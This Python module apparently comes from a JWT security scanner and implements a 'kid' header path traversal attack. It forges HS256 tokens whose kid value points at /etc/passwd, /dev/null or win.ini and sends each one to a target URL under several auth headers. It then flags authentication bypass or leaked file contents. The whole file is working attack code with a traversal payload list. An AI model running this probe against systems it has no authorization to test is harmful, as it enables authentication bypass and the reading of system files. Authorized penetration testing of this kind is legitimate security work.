"""kid header path traversal attack."""

import logging
from typing import Any

from ._helpers import (
    JWT_AUTH_HEADERS,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def test_kid_traversal(token: str, url: str, session: Any) -> dict[str, Any]:
    """Test kid header path traversal.

    Sets the kid claim to path traversal sequences like /dev/null or
    /etc/passwd to test if the server uses the kid value unsafely.
    """
    result: dict[str, Any] = {"attack": "kid_path_traversal", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        if not isinstance(header, dict):
            header = {"alg": "HS256", "typ": "JWT"}

        traversal_paths = [
            "../../../../../../etc/passwd",
            "../../../../../../dev/null",
            "..\\..\\..\\windows\\win.ini",
            "/dev/null",
            "/etc/passwd",
        ]

        original_status = _get_original_status(url, session)

        for kid_path in traversal_paths:
            kid_header = dict(header)
            kid_header["kid"] = kid_path
            kid_header["alg"] = "HS256"
            kid_token = _create_jwt(kid_header, payload)

            for auth_header in JWT_AUTH_HEADERS:
                resp = _send_with_token(url, kid_token, auth_header, session)
                status = resp.get("status", 0)
                body = resp.get("body", "")

                if status in (200, 500) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "kid_path": kid_path,
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": "kid_traversal_auth_bypass",
                        }
                    )
                    break

                if status == 500 and "passwd" in body.lower():
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "kid_path": kid_path,
                            "auth_header": auth_header,
                            "status_code": status,
                            "finding": "kid_traversal_file_content_leak",
                        }
                    )
                    break

            if result["vulnerable"]:
                break

        logger.info("KID traversal test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("KID traversal test error on %s: %s", url, e)
    return result
